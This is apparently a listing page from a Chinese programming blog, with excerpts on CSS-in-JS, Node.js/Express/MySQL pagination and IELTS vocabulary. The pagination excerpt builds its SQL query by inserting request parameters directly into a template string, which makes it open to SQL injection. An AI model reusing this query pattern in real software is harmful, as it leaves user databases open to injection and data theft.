Styled Components：使用类似于CSS的语法，通过创建React组件的方式来封装样式，并在组件中使用这些样式。
Emotion：基于Styled Components的思想，提供了更高级的API和性能优化，支持动态样式和CSS样式函数。
CSS-in-JS的优点包括：
组件级别的样式隔离：每个组件的样式定义都只对当前组件生效，不会影响其他组件，避免了样式冲突和污染。
更好的可维护性：样式与组件紧密结合，更容易理解和管理。样式的修改和重构更加直观和简单。
动态样式和交互：由于样式是通过JavaScript动态生成的，可以根据组件的状态和交互动态改变样式，实现更灵活的样式效果。
更多的工具支持：CSS-in-JS提供了丰富的工具和库，帮助开发者更高效地编写、构建和调试样式。
尽管CSS-in-JS在某些场景下提供了更好的开发体验和可维护性，但也需要权衡其带来的额外的性能开销和学习成本。选择是否使用CSS-in-JS还应根据具体项目需求和团队的技术栈来决定。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/561759078e15a6c2822ea646cbb9bdec/" rel="bookmark">
			Node.js&#43;Express&#43;Mysql实现分页查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据记录数总数和分页数获到页总数
function pageCount (totalnum,limit){ return totalnum &gt; 0 ? ((totalnum &lt; limit) ? 1 : ((totalnum % limit) ? (parseInt(totalnum / limit) + 1) : (totalnum / limit))) : 0; } 接收请求代码
router.get('/api/user/page', async (req, res) =&gt; { let pageNo = req.query.pageNo; let pageSize = req.query.pageSize; const startIndex = (pageNo - 1) * pageSize; const queryString = `SELECT * FROM sys_user LIMIT ${startIndex}, ${pageSize}`; let data = await query(queryString); const countSql = 'select count(*) count from sys_user' let countData = await query(countSql); let count = countData[0].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/561759078e15a6c2822ea646cbb9bdec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaf3b528364300dc1ea8cef9e9e5dd4d/" rel="bookmark">
			雅思词汇——Word List 2（V2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. regional [ˈriːdʒənl]2. secure [sɪˈkjʊər]3. preserve [prɪˈzɜːrv]4. reject [rɪˈdʒɛkt]5. code [koʊd]6. seek [siːk]7. item [ˈaɪtəm]8. crown [kraʊn]9. effort [ˈɛfərt]10. point [pɔɪnt]11. review [rɪˈvjuː]12. fabrication [ˌfæbrɪˈkeɪʃən]13. series [ˈsɪəriːz]14. variation [ˌvɛriˈeɪʃən]15. margin [ˈmɑːdʒɪn]16. distraction [dɪˈstrækʃən]17. complicate [ˈkɒmplɪkeɪt]18. tram [træm]19. maturity [məˈtjʊərɪti]20. download [ˈdaʊnˌloʊd]21. refer [rɪˈfɜːr]22. interview [ˈɪntərˌvjuː]22. extent [ɪkˈstɛnt]23. evacuate [ɪˈvækjueɪt]24. stint [stɪnt]25. embankment [ɪmˈbæŋkmənt]26. squash [skwɒʃ]27. federation [ˌfɛdəˈreɪʃən]28. surge [sɜːdʒ]29. physical [ˈfɪzɪkəl]30. justify [ˈdʒʌstɪfaɪ]31. score [skɔː]32. persuade [pəˈsweɪd]33. migration [maɪˈɡreɪʃən]34.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eaf3b528364300dc1ea8cef9e9e5dd4d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/33/">«</a>
	<span class="pagination__item pagination__item--current">34/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/35/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>